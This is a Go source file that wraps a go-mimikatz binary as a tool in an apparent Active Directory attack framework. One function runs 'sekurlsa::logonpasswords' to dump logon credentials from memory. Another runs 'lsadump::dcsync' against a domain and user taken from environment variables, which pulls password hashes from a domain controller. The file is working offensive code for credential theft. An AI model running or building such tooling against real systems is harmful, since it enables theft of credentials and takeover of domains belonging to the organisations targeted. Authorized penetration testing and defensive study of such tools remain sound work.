package tools

import (
	"adpack/utils"
	"context"
	"fmt"
	"time"
)

type goMimikatzTool struct{}

var GoMimikatz = goMimikatzTool{}

func (goMimikatzTool) Name() string    { return "go-mimikatz" }
func (goMimikatzTool) Available() bool { return utils.ToolAvailable("go-mimikatz") }

type GoMimikatzConfig struct {
	Binary     string
	Command    string
	OutputFile string
	Timeout    int
}

func DefaultGoMimikatzConfig() GoMimikatzConfig {
	return GoMimikatzConfig{
		Binary:  "go-mimikatz",
		Command: "sekurlsa::logonpasswords",
		Timeout: 60,
	}
}

func (g goMimikatzTool) Sekurlsa(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error) {
	cfg := DefaultGoMimikatzConfig()
	if len(req.Args) > 0 {
		cfg.Command = req.Args[0]
	}
	timeout := cfg.Timeout
	if req.Timeout > 0 {
		timeout = int(req.Timeout.Seconds())
	}
	execCtx, cancel := context.WithTimeout(ctx, time.Duration(timeout)*time.Second)
	defer cancel()
	args := []string{cfg.Command}
	cr := utils.RunCommandCtx(execCtx, cfg.Binary, args)
	if !cr.Success {
		return cmdResultToExecResult(cr), &ToolError{Tool: "go-mimikatz", Op: "sekurlsa", ExitCode: cr.ExitCode, Err: fmt.Errorf("%s", cr.Stderr)}
	}
	return cmdResultToExecResult(cr), nil
}

func (g goMimikatzTool) SekurlsaDcsync(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error) {
	domain := req.Env["DOMAIN"]
	user := req.Env["USER"]
	if domain == "" || user == "" {
		return nil, &ToolError{Tool: "go-mimikatz", Op: "dcsync", Err: fmt.Errorf("DOMAIN and USER env required")}
	}
	cr := utils.RunCommandCtx(ctx, "go-mimikatz", []string{
		"lsadump::dcsync",
		fmt.Sprintf("/domain:%s", domain),
		fmt.Sprintf("/user:%s", user),
	})
	if !cr.Success {
		return cmdResultToExecResult(cr), &ToolError{Tool: "go-mimikatz", Op: "dcsync", ExitCode: cr.ExitCode, Err: fmt.Errorf("%s", cr.Stderr)}
	}
	return cmdResultToExecResult(cr), nil
}
